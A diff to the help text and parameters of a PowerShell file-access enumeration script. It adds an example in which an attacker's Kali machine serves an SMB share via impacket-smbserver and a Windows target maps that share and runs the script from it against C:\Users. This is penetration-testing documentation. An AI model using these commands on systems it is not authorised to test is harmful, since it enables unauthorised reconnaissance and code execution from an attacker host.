@@ -21,7 +21,16 @@
     PS> .\Find-FileAcces.ps1 -SearchPath 'C:\Users'
 
     .EXAMPLE
-    PS> .\Find-FileAccess.ps1 -SearchPath 'C:\inetpub' -JsonOutput
+    PS> .\Find-FileAccess.ps1 -SearchPath 'C:\inetpub' -JsonOutput:$true
+
+    .EXAMPLE
+    ...
+    ┌──(ben㉿kali-ct)-[~]
+    └─$ sudo impacket-smbserver -smb2support -username smb -password smb myshare .
+
+    PS> New-SmbMapping -LocalPath Z: -RemotePath \\kali-ip-address\myshare -UserName smb -Password smb
+
+    PS> Start-Job -FilePath Z:\Find-FileAccess.ps1 -ArgumentList 'C:\Users', $true
 #>
 [CmdletBinding()]
 Param (
@@ -30,7 +39,7 @@ Param (
     [String]$SearchPath = $PWD.Path,
 
     [Parameter()]
-    [Switch]$JsonOutput
+    [Bool]$JsonOutput = $false
 )
 begin {
     if (-not ((Get-Item $SearchPath) -is [System.IO.DirectoryInfo])) { 
